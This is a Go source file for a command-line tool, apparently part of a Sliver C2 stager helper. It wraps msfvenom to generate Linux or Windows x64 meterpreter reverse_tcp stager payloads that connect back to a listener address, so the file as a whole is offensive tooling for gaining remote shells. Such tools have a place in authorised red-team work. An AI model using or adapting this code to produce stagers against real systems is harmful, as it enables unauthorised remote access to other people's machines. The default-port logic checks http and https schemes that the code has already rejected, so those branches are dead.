package stagerOne

import (
	"bytes"
	"fmt"
	"net/url"
	"os/exec"

	c "github.com/Esonhugh/sliver-stage-helper/cmd/sliverStager/cmd"
	"github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
)

var Opt = struct {
	StagerType string
	Format     string
	Advanced   string
	ListenURL  string
	Output     string
}{}

func init() {
	StagerOneCmd.Flags().StringVarP(&Opt.StagerType, "stagerType", "t", "linux-x64-tcp", "stager type")
	StagerOneCmd.Flags().StringVarP(&Opt.Format, "format", "f", "raw", "output format")
	StagerOneCmd.Flags().StringVarP(&Opt.Advanced, "advanced", "a", "", "advanced options")
	StagerOneCmd.Flags().StringVarP(&Opt.ListenURL, "listenUrl", "l", "tcp://127.0.0.1:4444", "listener URL")
	StagerOneCmd.Flags().StringVarP(&Opt.Output, "output", "o", "/dev/stdout", "output file")
	c.RootCmd.AddCommand(StagerOneCmd)
}

var log = logrus.WithField("cmd", "stagerOne")

var StagerOneCmd = &cobra.Command{
	Use:     "stagerOne",
	Aliases: []string{"st", "stager1", "stage1", "s1"},
	Short:   "stagerOne Generates a common stager",
	Long:    "stagerOne",
	Run: func(cmd *cobra.Command, args []string) {
		args, err := ArgCreate(Opt.StagerType, Opt.ListenURL, Opt.Format)
		if err != nil {
			log.Fatal(err)
		}
		if Opt.Advanced != "" {
			log.Debugf("advanced options: %s", Opt.Advanced)
			args = append(args, Opt.Advanced)
		}
		p, err := msfvenom(args)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(p))
	},
}

func ArgCreate(stagerType, listenerURL, format string) ([]string, error) {
	var platform, arch, payloadName string
	switch stagerType {
	case "linux-x64-tcp":
		platform = "linux"
		arch = "x64"
		payloadName = "linux/x64/meterpreter/reverse_tcp"
	case "windows-x64-tcp":
		platform = "windows"
		arch = "x64"
		payloadName = "windows/x64/meterpreter/reverse_tcp"
	default:
		return nil, fmt.Errorf("stager type %s not supported", stagerType)
	}

	u, err := url.Parse(listenerURL)
	if err != nil {
		return nil, fmt.Errorf("invalid listener URL: %v", err)
	}

	switch u.Scheme {
	case "tcp":
	default:
		return nil, fmt.Errorf("invalid listener URL scheme: %s", u.Scheme)
	}

	var port = u.Port()
	if port == "" {
		if u.Scheme == "http" {
			port = "80"
		} else if u.Scheme == "https" {
			port = "443"
		} else {
			port = "4444"
		}
	}

	args := []string{
		"--platform", platform,
		"--arch", arch,
		"--format", format,
		"--payload", payloadName,
		"-o", Opt.Output,
		fmt.Sprintf("LHOST=%s", u.Hostname()),
		fmt.Sprintf("LPORT=%s", port),
		"EXITFUNC=thread",
	}
	return args, nil
}

const venomBin = "msfvenom"

func msfvenom(args []string) ([]byte, error) {
	if _, err := exec.LookPath(venomBin); err != nil {
		return nil, fmt.Errorf("msfvenom not found in PATH")
	}

	log.Debugf("cmd %s %v", venomBin, args)
	cmd := exec.Command(venomBin, args...)
	stdout := new(bytes.Buffer)
	stderr := new(bytes.Buffer)
	cmd.Stdout = stdout
	cmd.Stderr = stderr
	err := cmd.Run()
	log.Info(cmd.String())
	if err != nil {
		log.Debugf("--- stdout ---\n%s\n", stdout.String())
		log.Debugf("--- stderr ---\n%s\n", stderr.String())
		log.Error(err)
	}

	return stdout.Bytes(), err
}
